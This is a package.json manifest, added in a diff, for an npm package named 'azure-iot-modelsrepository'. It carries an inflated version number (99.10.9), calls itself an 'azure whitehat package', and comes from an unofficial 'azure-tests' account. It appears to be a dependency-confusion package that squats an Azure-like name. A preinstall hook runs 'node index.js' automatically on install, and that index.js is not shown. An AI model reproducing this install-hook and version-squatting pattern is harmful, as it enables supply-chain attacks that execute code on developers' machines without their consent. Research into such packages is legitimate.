@@ -1,0 +1,39 @@
+{
+    "name": "azure-iot-modelsrepository",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-iot-modelsrepository@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-d1IyuWENqnM8Pmi3tr/ABdO682NJnVX+K+MBB2Qs4JseOUmSs/lR60lpH02U7VQvYO5b4b2KTRfLR3tlhXg80A==",
+        "shasum": "5163322092ff5ec6bf60340f0d9567ee42afb4c9",
+        "tarball": "https://registry.npmjs.org/azure-iot-modelsrepository/-/azure-iot-modelsrepository-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3590,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoStrCRA9TVsSAnZWagAAqIcP/jyf5dHJSnJKgQ+BO9R7\n7GG71aamzMeKFuVkVK96p+3NwOGoMeSpw6fO88CIBp6/k3R3G3JrRpjXsDT0\nr4w0QpcOmULj7bJkyhda6ZKj7zeyvfwCK9zD5ydvD+rxlxtqDxPv3OWd+p8A\nZKIAWV0EUmu3cvUCqRHXk+JFb3PcucGM15HBWES7m0yyB/0qLvO2x3gMvXPH\n4fqNAAw8FqKZXpyPHRhNAhZrIkloT3QpyIJ0J7jmtukWLp3AJpYWkrib/0Jg\nqGk13eoTuyVts9Ukqxa3H/QMhyjtkQy5PyAcW1ot58JcSU6r2n2y9Shp4n8B\n//WElTwGal/YvmhFF8GPB6fVFnAzIqryCGCwRJhD7pGRwHFBhquoDu/1Bg9z\nz+ebAM3o3ip1eDGb137/DPKPYTtVy/oSeZh9Bd3SrlyTYpCRcr8Mi2vNlaAp\n/DY50DnAHpWuu04jHR5eXzMthY7+D4z/cMYpxVRzTl10YE7rooeBYQOYnzEG\nLcMG9YlBu2rJr7XA+KfLYdSORRN8bx6bxShjPHK/d+JXZKCdAUJqWcEQCX4L\n4g6tyVCwX5gbi9IhC4GChePkqLRT9ONlytogyobLLsZ1bN140G5XZD95I7pp\nWgGLDV1dD2+UuzS2HsSXXpD8Oc14hn4ML4FG/IHCnB0glrjU3khcQcTTlijT\n/aW7\r\n=H//0\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-iot-modelsrepository_99.10.9_1637952363777_0.4958145201598554"
+    },
+    "_hasShrinkwrap": false
+}
